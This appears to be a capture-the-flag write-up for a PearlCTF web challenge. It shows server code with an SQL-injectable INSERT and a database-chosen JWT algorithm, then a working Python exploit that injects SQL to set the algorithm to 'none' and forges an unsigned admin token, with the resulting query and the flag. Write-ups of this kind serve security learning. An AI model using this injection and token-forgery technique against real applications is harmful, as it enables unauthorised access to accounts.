---
ai_date: 2025-04-27 05:27:22
ai_summary: SQL Injection vulnerability in user registration, allowing bypassing JWT algorithm check
ai_tags:
  - sql
  - injection
  - xss
created: 2025-03-07T15:57
updated: 2025-07-14T09:46
---

Notice that the algorithm is fetched from database, so how do we change the algorithm to none?

```python
def decode_access_token(token):
    try:
        user_data = jwt.decode(token, options={"verify_signature": False})
        user = user_data['user']
        algorithm = User.query.filter_by(username=user).first().jwt_algorithm
        if algorithm == 'HS256':
            user_data = jwt.decode(token, app.config['JWT_SECRET'], algorithms=[algorithm])
        elif algorithm == 'none':
            user_data = jwt.decode(token, options={'verify_signature': False}, algorithms=[algorithm])
        else:
            user_data = jwt.decode(token, algorithms=[algorithm])
    except:
        return None
    return user_data
```

Notice that the SQL insert statement is vulnerable to SQL injection.
```python
db.session.execute(text(f'INSERT INTO User (username, password_hash, jwt_algorithm) VALUES ("{username}", "{bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")}", "HS256")'))
db.session.commit()
```

A very simple payload would work.

```python
import bcrypt
import requests
import jwt


def register(user, passw):
    print(f'INSERT INTO User (username, password_hash, jwt_algorithm) VALUES ("{user}", "{bcrypt.hashpw(passw.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")}", "HS256")')
    return requests.post('https://quote.ctf.pearlctf.in/register', data={'username': user, 'password': passw})


print(register(f'kumo", "{bcrypt.hashpw('admin'.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")}", "none") --', "lol"))
payload = {
    "user": "kumo",
    "admin": True
}
token = jwt.encode(payload, algorithm='none', key='')
print(requests.get('https://quote.ctf.pearlctf.in/profile', headers={
    'Cookie': 'access_token='+token
}).text)
```

```sql
INSERT INTO User (username, password_hash, jwt_algorithm) VALUES ("kumo", "$2b$12$6ctTo718RdGaWdRA2io0g.nWdfMee/pwFZCiaZn59E8YOexgGspnG", "none") --", "$2b$12$84iNRBtP4ShbIv3Uk5qqnOHlBnd2sXS2CuzVZambD5cxiODTGN6y6", "HS256")
```

```flag
pearl{select_from_flag__where_username=hecker}
```